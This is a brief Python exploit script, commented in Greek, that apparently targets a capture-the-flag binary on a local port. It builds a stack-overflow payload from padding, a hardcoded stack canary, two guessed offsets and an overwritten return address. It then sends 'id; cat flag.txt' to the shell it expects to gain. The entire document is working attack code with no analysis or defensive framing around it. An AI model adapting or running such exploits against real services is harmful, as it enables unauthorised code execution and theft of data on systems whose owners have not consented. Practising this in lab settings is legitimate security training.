import socket
import time

host, port = '127.0.0.1', 28285
canary = b"\x00\x78\x5b\x1b\x1c\x40\x19\x00"
addr = b"\x26\x92\x04\x08"

# Δοκιμάζουμε τα δύο πιο πιθανά offsets που προκύπτουν από το disassembly
for junk_size in [12, 28]:
    print(f"[*] Trying Junk: {junk_size}")
    payload = b"A" * 122 + canary + b"A" * junk_size + addr + b"\n"
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((host, port))
        s.sendall(payload)
        
        # Περίμενε να δεις αν απαντήσει
        time.sleep(0.2)
        s.sendall(b"id; cat flag.txt\n")
        
        data = s.recv(4096)
        if data:
            print(f"[!] Response from Junk {junk_size}:")
            print(data.decode(errors='ignore'))
            # Αν δούμε κάτι, μείνε μέσα
            while True:
                res = s.recv(4096)
                if not res: break
                print(res.decode(errors='ignore'))
        s.close()
    except Exception as e:
        print(f"[-] Junk {junk_size} failed: {e}")